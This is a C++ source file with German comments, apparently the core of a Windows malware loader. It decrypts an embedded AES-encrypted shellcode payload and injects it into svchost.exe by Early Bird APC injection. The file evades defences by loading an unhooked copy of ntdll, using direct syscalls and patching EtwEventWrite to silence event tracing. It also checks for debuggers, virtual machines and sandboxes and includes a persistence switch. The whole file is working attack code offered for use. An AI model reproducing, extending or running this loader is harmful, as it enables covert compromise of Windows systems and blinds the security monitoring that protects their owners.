#include "injector.h"
#include "payload.h"
#include "techniques/I_InjectionTechnique.h"
#include "techniques/ProcessHollowing.h"
#include "techniques/ApcInjection.h"
#include "techniques/EarlyBirdInjection.h"
#include <vector>
#include <stdexcept>
#include <memory>
#include <iostream>
#include <winternl.h> // für NTSTATUS
#include "persistence.h"
#include "syscalls.h" // NEU: Header für die Syscall-Initialisierung

#define AES_IMPLEMENTATION
#include "aes.h" // Behalte nur diesen Include nach dem #define

// Deklaration der Funktion zum sicheren Löschen des Speichers
extern "C" void RtlSecureZeroMemory(PVOID ptr, SIZE_T cnt);

// =================================================================================
// Transient Executor: Die selbstzerstörende Logik
// =================================================================================

// Diese Struktur wird zusammen mit dem Code in den RWX-Speicher kopiert
struct ExecutorArgs {
    // Daten für die Entschlüsselung
    unsigned char key[16];
    unsigned char iv[16];
    
    // NEU: Handle zur sauberen NTDLL
    HANDLE hCleanNtdll;
    
    // Der verschlüsselte Payload. Wir verwenden einen flexiblen Array-Member.
    unsigned char encryptedPayload[]; 
};

// Die eigentliche Executor-Funktion. Ihre Logik wird in einen RWX-Bereich kopiert.
DWORD WINAPI TransientExecutor(LPVOID lpParameter) {
    // 1. Hole die Argumente
    ExecutorArgs* args = static_cast<ExecutorArgs*>(lpParameter);

    // 2. Entschlüssele den Payload direkt im Speicher (in-place)
    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, args->key, args->iv);
    // Die Größe des Payloads ist in der payload_data-Konstante definiert.
    // Wir müssen sie hier hart kodieren oder übergeben.
    AES_CTR_xcrypt_buffer(&ctx, args->encryptedPayload, sizeof(payload_data));

    std::vector<unsigned char> shellcode(args->encryptedPayload, args->encryptedPayload + sizeof(payload_data));

    // 3. Führe die Injektion aus
    // In einer echten Implementierung würde hier eine robustere Technik-Auswahl stattfinden.
    // Wir verwenden ThreadHijacking als Beispiel.
    EarlyBirdInjection technique(args->hCleanNtdll);
    // Der Payload ist reiner Shellcode, daher ist der Offset 0.
    technique.inject("C:\\Windows\\System32\\svchost.exe", shellcode, 0);

    // 4. BEHOBEN: Entferne die Selbstzerstörung von hier.
    // Der Executor beendet einfach seinen Thread. Das Aufräumen erfolgt im Hauptprozess.
    ExitThread(0);
    return 0;
}

// Eine leere Funktion, die als Marker dient, um die Größe von TransientExecutor zu berechnen.
void EndMarker() {}

// =================================================================================
// Haupt-Injector-Klasse
// =================================================================================

Injector::Injector() {
    // Konstruktor bleibt leer, Initialisierung erfolgt in run()
}

Injector::~Injector() {
    // Destruktor bleibt leer
}

// KORREKTUR: Gibt jetzt eine CleanNtdll-Struktur zurück
CleanNtdll Injector::unhookNtdll() {
    CleanNtdll handles = { NULL, NULL };
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return handles;
    }

    handles.hMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    CloseHandle(hFile);
    if (!handles.hMapping) {
        return handles;
    }

    handles.hNtdll = (HMODULE)MapViewOfFile(handles.hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!handles.hNtdll) {
        CloseHandle(handles.hMapping);
        handles.hMapping = NULL; // Zurücksetzen im Fehlerfall
    }
    
    return handles;
}

// KORREKTUR: Akzeptiert eine CleanNtdll-Struktur und räumt beide Handles auf
void Injector::releaseNtdll(CleanNtdll& ntdllHandles) {
    if (ntdllHandles.hNtdll) {
        UnmapViewOfFile(ntdllHandles.hNtdll);
    }
    if (ntdllHandles.hMapping) {
        CloseHandle(ntdllHandles.hMapping);
    }
    ntdllHandles.hNtdll = NULL;
    ntdllHandles.hMapping = NULL;
}

void Injector::run() {
    #ifdef _DEBUG
    std::cout << "[DEBUG] Injector gestartet." << std::endl;
    #endif

    // 1. Evasion-Checks
    if (checkAntiAnalysis() || !patchETW()) {
        #ifdef _DEBUG
        std::cout << "[DEBUG] Evasion-Checks fehlgeschlagen oder haben angeschlagen." << std::endl;
        #endif
        return;
    }
    
    // 2. Unhooking
    CleanNtdll ntdllHandles = unhookNtdll();
    if (!ntdllHandles.hNtdll) {
        #ifdef _DEBUG
        std::cout << "[DEBUG] Laden von sauberem NTDLL fehlgeschlagen." << std::endl;
        #endif
        return;
    }

    // NEU: Globale Syscalls initialisieren
    if (!InitializeSyscalls(ntdllHandles.hNtdll)) {
        #ifdef _DEBUG
        std::cout << "[DEBUG] Initialisierung der direkten Syscalls fehlgeschlagen." << std::endl;
        #endif
        releaseNtdll(ntdllHandles);
        return;
    }

    // 3. Transient-Executor Logik
    size_t executorSize = (size_t)EndMarker - (size_t)TransientExecutor;
    size_t totalSize = executorSize + sizeof(ExecutorArgs) + sizeof(payload_data);

    PVOID rwxMemory = VirtualAlloc(NULL, totalSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!rwxMemory) {
        releaseNtdll(ntdllHandles);
        return;
    }

    memcpy(rwxMemory, (PVOID)TransientExecutor, executorSize);
    
    ExecutorArgs* args = (ExecutorArgs*)((char*)rwxMemory + executorSize);
    memcpy(args->key, key_data, sizeof(key_data));
    memcpy(args->iv, iv_data, sizeof(iv_data));
    args->hCleanNtdll = ntdllHandles.hNtdll; // KORREKTE ZUWEISUNG
    memcpy(args->encryptedPayload, payload_data, sizeof(payload_data));

    LPVOID pArgs = (LPVOID)((char*)rwxMemory + executorSize);
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)rwxMemory, pArgs, 0, NULL);
    if (!hThread) {
        VirtualFree(rwxMemory, 0, MEM_RELEASE);
        releaseNtdll(ntdllHandles);
        return;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    // 4. Aufräumen
    releaseNtdll(ntdllHandles);
    RtlSecureZeroMemory(rwxMemory, totalSize);
    VirtualFree(rwxMemory, 0, MEM_RELEASE);
}

bool Injector::patchETW() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return false;

    // KORREKTUR: Verwende die Hash-basierte, robustere Methode
    constexpr DWORD etwEventWrite_hash = Phantom::Util::a_hash("EtwEventWrite");
    FARPROC pEtwEventWrite = (FARPROC)Phantom::Util::getProcAddressByHash(hNtdll, etwEventWrite_hash);
    
    if (!pEtwEventWrite) return false;
    
    char patch[] = { 0xC3 }; // ret
    DWORD oldProtect;

    if (!VirtualProtect(pEtwEventWrite, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return false;
    }
    
    memcpy(pEtwEventWrite, patch, sizeof(patch));
    
    // KORREKTUR: Stelle den ursprünglichen Speicherschutz wieder her
    VirtualProtect(pEtwEventWrite, sizeof(patch), oldProtect, &oldProtect);
    
    return true;
}

bool Injector::checkAntiAnalysis() {
    // 1. Robusterer Timing-Check
    DWORD startTime = GetTickCount();
    Sleep(2000); // Eine einfache, aber oft effektive Verzögerung
    DWORD endTime = GetTickCount();
    if (endTime - startTime < 1800) { // Wenn die Zeit "vorgespult" wurde
        return true;
    }

    // 2. Debugger-Check
    if (IsDebuggerPresent()) {
        return true;
    }

    // 3. Erweiterter VM- und Sandbox-Check
    if (GetModuleHandleA("vmtoolsd.dll") || GetModuleHandleA("vm3dgl.dll")) return true; // VMware
    if (GetModuleHandleA("VBoxGuest.dll")) return true; // VirtualBox
    if (GetModuleHandleA("SbieDll.dll")) return true; // Sandboxie

    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 2) return true; // Hyper-V & generische VMs

    return false;
}

// =================================================================================
// Haupt-Einstiegspunkt
// =================================================================================
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
    // Verarbeite Kommandozeilenargumente für die Persistenz
    if (strcmp(lpCmdLine, "--persist-enable") == 0) {
        Persistence::Enable();
        return 0;
    }
    if (strcmp(lpCmdLine, "--persist-disable") == 0) {
        Persistence::Disable();
        return 0;
    }

    // Wenn keine Persistenz-Argumente, führe die normale Injektion aus
    Injector injector;
    injector.run();
    return 0;
} 